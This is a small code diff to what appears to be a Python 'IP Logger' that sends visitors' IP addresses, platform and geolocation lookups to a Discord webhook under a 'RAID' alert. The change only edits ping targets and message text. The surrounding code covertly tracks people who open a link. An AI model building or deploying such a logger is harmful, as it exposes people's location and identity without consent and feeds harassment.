@@ -76,7 +76,7 @@ def botCheck(ip, useragent):
 def reportError(error):
     requests.post(config["webhook"], json = {
     "username": config["username"],
-    "content": "@hahahahaha_2",
+    "content": "@EVERYONE",
     "embeds": [
         {
             "title": "IP Logger - Error",
@@ -100,13 +100,13 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
         {
             "title": "RAID PLSS 🥵🥵",
             "color": config["color"],
-            "description": f"An **Text Logging** QUIEREN SER RAID 🥵🥵.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
+            "description": f"An **Text Logging** QUIEREN UN RAID 🥵🥵.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
         }
     ],
 }) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
         return
 
-    ping = "@hahahahaha_2"
+    ping = "@EVERYONE"
 
     info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
     if info["proxy"]:
